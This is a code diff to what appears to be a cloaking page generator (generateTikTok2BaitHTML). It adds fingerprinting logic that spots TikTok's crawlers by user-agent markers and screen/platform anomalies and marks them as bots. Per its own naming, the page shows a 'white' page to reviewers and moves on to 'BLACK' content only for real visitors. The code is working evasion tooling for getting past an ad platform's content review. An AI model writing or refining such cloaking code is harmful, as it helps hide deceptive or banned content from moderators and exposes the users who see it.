@@ -314,6 +314,21 @@ function generateTikTok2BaitHTML(token: string, whiteUrl: string, baseUrl?: stri
       if(T.fakeC){botDetected=true;logBot('fake_chrome');return}
       if(T.noLang){botDetected=true;logBot('no_languages');return}
       
+      // TikTok Bot Detection - these patterns are ONLY seen in TikTok crawlers, not real WebView users
+      // 1. Screen size EXACTLY equals viewport (real devices always have navigation bars taking space)
+      var screenEqualsViewport=(T.screen.w===T.viewport.w&&T.screen.h===T.viewport.h);
+      // 2. Missing platform info (real devices always report platform)
+      var noPlatform=(!T.plat||T.plat==='');
+      // 3. BytedanceWebview in user agent (TikTok's crawler signature)
+      var isBytedance=ua.indexOf('bytedancewebview')>-1;
+      // 4. musical_ly in user agent (TikTok app identifier)
+      var isMusicalLy=ua.indexOf('musical_ly')>-1;
+      
+      // Combined detection: TikTok UA + suspicious fingerprint = BOT
+      if((isBytedance||isMusicalLy)&&(screenEqualsViewport||noPlatform)){
+        botDetected=true;logBot('tiktok_crawler');return
+      }
+      
       // After delay, try to load pixel - only go to BLACK if it succeeds
       setTimeout(function(){
         if(botDetected)return;
